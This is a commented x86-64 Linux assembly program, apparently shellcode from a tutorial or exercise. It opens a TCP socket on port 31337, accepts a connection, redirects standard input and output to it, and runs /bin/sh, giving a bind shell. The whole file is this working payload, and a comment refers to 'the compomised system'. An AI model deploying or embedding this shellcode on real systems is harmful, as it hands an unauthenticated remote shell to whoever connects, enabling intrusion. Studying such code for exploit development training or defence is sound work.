section .text
global _start
  
_start:
    ; some clean up first
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    xor r10, r10 
    xor r8,r8
    xor r9,r9
 
    ; Register allocation for system calls in 64bit assembly language
    ; function_call(%rax) = function(%rdi,  %rsi,  %rdx,  %r10,  %r8,  %r9)
    ;               ^system          ^arg1  ^arg2  ^arg3  ^arg4  ^arg5 ^arg6
    ;                call #
 
    ; Socket
    ; Function prototype:
    ;       int socket(int domain, int type, int protocol)
    ; Purpose:
    ;       creates an endpoint for communications, returns a
    ;       descriptor that will be used thoughout the code to
    ;       bind/listen/accept communications
    ; C Code:
    ;       sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
    push    0x2    ; domain, AF_INET, found in sys/socket.h
    pop     rdi    ; pop value from stack into int domain, first argument
    push    0x1    ; type, SOCK_STREAM, found in bits/socket_type.h
    pop     rsi    ; pop value from stack into int type, second argument
    push    0x6    ; protocol, TCP, found in /etc/protocols
    pop     rdx    ; pop value from stack into int protocol, third argument
    push    0x29   ; socket syscall
    pop     rax      
    syscall  
    mov     r8,rax ; move return value into r8
 
    ; Bind
    ; Function prototype:
    ;      int bind(int sockfd, const struct sockaddr *addr,      
    ;               socklen_t addrlen)                            
    ; Purpose:
    ;       assigns the addess in addr to the socket descriptor,
    ;       basically "giving a name to a socket"
    ; C Code:
    ;       hostaddr.sin_family = AF_INET;
    ;       hostaddr.sin_port = htons(31337);
    ;       hostaddr.sin_addr.s_addr = INADDR_ANY;
    ;       memset(&(hostaddr.sin_zero), '\0', 8);
    ;       bind(sockfd, (struct sockaddr *)&hostaddr, sizeof(struct sockaddr));
 
    xor     r10,r10
    push    r10
    push    r10
    mov     byte [rsp],0x2 ; AF_INET, sockaddr.sa_family value
    mov     word [rsp+0x2],0x697a ; port 31337, sockaddr.sa_data[] value
    mov     rsi,rsp ; put values into sockaddr structure
    push    r8      ; socket file descriptor
    pop     rdi     ; put socket_fd from r8 into rdi, first argument
    push    0x10    ; push 16 on stack       
    pop     rdx     ; pop 16 from stack into addrlen, third argument        
    push    0x31    ; bind syscall
    pop     rax     ; pop value from stack into function number to call 
    syscall 
 
    ; Listen
    ; Function prototype:
    ;       int listen(int sockfd, int backlog)
    ; Purpose:
    ;       sets the socket in the descriptor in preparation to
    ;       accepting incoming communications
    ; C Code:
    ;       listen(sockfd, 1);
 
    push    r8   ; push socket file descriptor onto stack
    pop     rdi  ; pop value from stack into int sockfd, first argument
    push    0x1  ; push 1 onto stack
    pop     rsi  ; pop value from stack into int backlog, second argument
    push    0x32 ; listen syscall
    pop     rax  ; pop value from stack into function number to call 
    syscall 
 
    ; Accept
    ; Function prototype:
    ;       int accept(int sockfd, struct sockaddr *addr,
    ;               socklen_t *addrlen)
    ; Purpose:
    ;       accepts a connection on a socket and returns a new
    ;       file descriptor referring to the socket which is used
    ;       to bind stdin, stdout and stderr to the local terminal
    ; C Code:
    ;       sinsz = sizeof(struct sockaddr_in); 
    ;       dupsockfd = accept(sockfd, (struct sockaddr *)&clientaddr, &sinsz);
 
    mov     rsi,rsp ; make address of sockaddr structure equal to stack pointer
    xor     rcx,rcx ; zero rcx
    mov     cl,0x10 ; put 16 into lower 8bits of rcx
    push    rcx     ; push rcx (10) onto stack
    mov     rdx,rsp ; make socklen_t value of stack pointer
    push    r8      ; push socket file descriptor onto stack
    pop     rdi     ; pop socket file descriptor of stack into int sockfd
    push    0x2b    ; push accept syscall number (43) onto stack
    pop     rax     ; pop this value into rax
    syscall 
 
    ; Dup2
    ; Function prototype:
    ;       int dup2(int oldfd, int newfd)
    ; Purpose:
    ;       duplicate a file descriptor, copies the old file
    ;       descriptor to a new one allowing them to be used
    ;       interchangably, this allows all shell i/o to/from the
    ;       compomised system.
    ; C Code:
    ;       dup2(dupsockfd,0); /* stdin */
    ;       dup2(dupsockfd,1); /* stdout */
    ;       dup2(dupsockfd,2); /* stderr */
 
    pop     rcx     ; pop value on top of stack into rcx
    xor     r9,r9   ; zero r9
    mov     r9,rax  ; put return value from accept syscall into r9
    mov     rdi,r9  ; put value from r9 into oldfd, first argument
    xor     rsi,rsi ; zero rsi
    push    0x3     ; place 3 on top of stack
    pop     rsi     ; pop 3 from stack into newfd, second argument
loop:
    dec     rsi     ; subtract 1 from value in rsi
    push    0x21    ; push (33) onto stack, value of dup2 syscall
    pop     rax     ; pop (33) from stack into rax
    syscall 
    jne     loop    ; if zero not set in flag register loop again, else continue
 
    ; Execve
    ; Function prototype:
    ;       int execve(const char *filename, char *const argv[],
    ;               char *const envp[]);
    ; Purpose:
    ;       execve() executes the program pointed to by filename.  
    ;       filename must be either a binary executable, or a script.   
    ; C Code:
    ;       execve("/bin/sh", argv, envp);
 
    xor     rdi,rdi ; zero rdi
    push    rdi     ; push zero onto stack
    push    rdi     ; push another zero onto stack
    pop     rsi     ; pop zero from stack into argv[], second argument
    pop     rdx     ; pop zero from stack into envp[], third argument
    mov     rdi,0x68732f6e69622f2f  ; mov hs/nib// into filename, first argument
    shr     rdi,0x8 ; remove first / and make NULL terminated string
    push    rdi     ; push /bin/shNULL onto stack
    push    rsp     ; push stack pointer onto stack
    pop     rdi     ; pop pointer to filename into filename, first argument
    push    0x3b    ; push (59) onto stack, value of execve syscall
    pop     rax     ; pop (59) from stack into rax
    syscall 
    
